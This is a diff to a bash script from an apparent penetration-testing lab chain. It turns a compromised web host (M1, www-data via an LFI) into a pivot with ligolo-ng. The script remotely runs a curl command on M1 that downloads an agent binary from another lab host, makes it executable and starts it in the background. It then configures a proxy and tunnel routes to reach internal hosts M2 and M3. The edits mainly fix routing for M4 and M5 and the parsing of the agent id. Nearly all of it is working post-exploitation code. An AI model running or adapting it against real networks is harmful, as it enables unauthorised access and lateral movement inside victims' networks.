@@ -3,7 +3,8 @@
 #  lab/chain/01b-pivot.sh — convierte M1 en el trampolín de la cadena
 # ----------------------------------------------------------------------------
 #  Después de 01 (www-data en M1), sube el agente de ligolo-ng a M1 y monta el
-#  túnel en M6. A partir de aquí el tráfico a M2-M5 sale por M1.
+#  túnel en M6. A partir de aquí el tráfico a M2 y M3 sale por M1; M4 y M5
+#  comparten L2 con M6 y van directo por eth1 (no se enrutan por el túnel).
 #
 #  Requiere: 01 --run ejecutado (WS_SID en /tmp/lab-chain.env) y ligolo-ng
 #  en artifacts/pocs/.
@@ -30,6 +31,7 @@ STATE="${LAB_STATE:-${TMPDIR:-/tmp}/lab-chain.env}"
 LFI_PATH="${LFI_PATH:-/wp-content/plugins/legacy-download/dl.php}"
 PROXY_PORT="${PROXY_PORT:-11601}"
 IFACE_NAME="${IFACE_NAME:-lab}"
+DIRECT_IFACE="${DIRECT_IFACE:-eth1}"
 CFG="$WORK/ligolo.yaml"
 PROXY_LOG="$WORK/ligolo-proxy.log"
 
@@ -53,15 +55,19 @@ m1_exec() { # m1_exec <comando sh>
 }
 
 lab_banner
-step "pivote · M1 (${M1}) como puerta hacia M2-M5"
+step "pivote · M1 (${M1}) como puerta hacia M2 y M3"
 
 if (( CHECK )); then
   step "estado del pivote"
   sysctl -n net.ipv4.ip_forward >/dev/null 2>&1 || true
   ip -brief addr show "$IFACE_NAME" 2>/dev/null || warn "interfaz $IFACE_NAME no existe"
-  for h in "$M2" "$M3" "$M4" "$M5"; do
+  for h in "$M2" "$M3"; do
     r="$(ip route get "$h" 2>/dev/null | head -1 || true)"
     if grep -q "dev $IFACE_NAME" <<<"$r"; then ok "$h por $IFACE_NAME"; else warn "$h NO va por $IFACE_NAME: $r"; fi
+  done
+  for h in "$M4" "$M5"; do
+    r="$(ip route get "$h" 2>/dev/null | head -1 || true)"
+    if grep -q "dev $DIRECT_IFACE" <<<"$r"; then ok "$h directo por $DIRECT_IFACE"; else warn "$h NO va directo por $DIRECT_IFACE: $r"; fi
   done
   exit 0
 fi
@@ -70,7 +76,8 @@ cat <<EOF
 Pasos:
   1. agente en M1 (como www-data): $WORK/agent -connect $M6:$PROXY_PORT -ignore-cert -retry
   2. proxy en M6 (root):            ligolo-proxy -selfcert -laddr 0.0.0.0:$PROXY_PORT -config $CFG
-  3. rutas /32 por la interfaz $IFACE_NAME (no tocar .11 ni .20)
+  3. rutas /32 por la interfaz $IFACE_NAME solo para $M2 y $M3
+     ($M4 y $M5 van directo por $DIRECT_IFACE; forzarlas por el túnel rompe el callback)
   4. verificar: ip route get $M2  ->  dev $IFACE_NAME
 EOF
 
@@ -85,14 +92,14 @@ need_cmd ip
 mkdir -p "$WORK"
 
 step "datos de M1 (interfaz y MAC para el id del agente)"
-mac="$(m1_exec "cat /sys/class/net/*/address 2>/dev/null | head -1" | tr -d ':\r\n' | tr 'A-Z' 'a-z')"
+mac="$(m1_exec "cat /sys/class/net/*/address 2>/dev/null | head -1" | grep -oE '([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}' | head -1 | tr -d ':' | tr 'A-Z' 'a-z')"
 [[ -n "$mac" ]] || mac="labm1$(date +%s)"
 ok "id de agente: $mac"
 
 step "config de ligolo"
 cat > "$CFG" <<EOF
 agent:
-    $mac:
+    "$mac":
         autobind: true
         interface: $IFACE_NAME
 interface:
@@ -100,8 +107,6 @@ interface:
         routes:
             - $M2/32
             - $M3/32
-            - $M4/32
-            - $M5/32
 web:
     enabled: false
 EOF
@@ -110,6 +115,7 @@ ok "config: $CFG"
 step "arrancando proxy en M6 (root)"
 if pgrep -f 'ligolo.*proxy' >/dev/null 2>&1; then
   ok "proxy ya está corriendo"
+  warn "si la config cambió, reinícialo: no debe reañadir las rutas de .14/.15"
 else
   command -v ligolo-proxy >/dev/null 2>&1 || die "falta ligolo-proxy (extrae artifacts/pocs/ligolo-ng_proxy_*.tar.gz en /usr/local/bin)"
   setsid nohup ligolo-proxy -selfcert -laddr "0.0.0.0:$PROXY_PORT" -config "$CFG" \
@@ -120,16 +126,18 @@ fi
 
 step "subiendo y arrancando el agente en M1"
 # Se descarga desde el espejo de M6 y se ejecuta como www-data.
-cmd='cd /tmp && curl -fsS http://10.10.10.20:8000/artifacts/pocs/ligolo-ng_agent_0.9.2_linux_amd64.tar.gz -o a.tgz && tar xzf a.tgz && chmod +x agent && (setsid nohup ./agent -connect 10.10.10.20:11601 -ignore-cert -retry -id '"$mac"' >/tmp/agent.log 2>&1 &) && echo started'
+cmd='cd /tmp && curl -fsS http://10.10.10.20:8000/artifacts/pocs/ligolo-ng_agent_0.9.2_linux_amd64.tar.gz -o a.tgz && tar xzf a.tgz && chmod +x agent && (setsid nohup ./agent -connect 10.10.10.20:11601 -ignore-cert -retry >/tmp/agent.log 2>&1 &) && echo started'
 m1_exec "$cmd" | tail -3
 
 step "esperando rutas"
 for i in $(seq 1 20); do
   if ip route get "$M2" 2>/dev/null | grep -q "dev $IFACE_NAME"; then
     ok "pivote activo: $M2 va por $IFACE_NAME"
-    for h in "$M3" "$M4" "$M5"; do
-      ip route get "$h" 2>/dev/null | grep -q "dev $IFACE_NAME" \
-        && ok "$h por $IFACE_NAME" || warn "$h aún no enruta por $IFACE_NAME"
+    ip route get "$M3" 2>/dev/null | grep -q "dev $IFACE_NAME" \
+      && ok "$M3 por $IFACE_NAME" || warn "$M3 aún no enruta por $IFACE_NAME"
+    for h in "$M4" "$M5"; do
+      ip route get "$h" 2>/dev/null | grep -q "dev $DIRECT_IFACE" \
+        && ok "$h directo por $DIRECT_IFACE" || warn "$h NO va directo por $DIRECT_IFACE"
     done
     exit 0
   fi
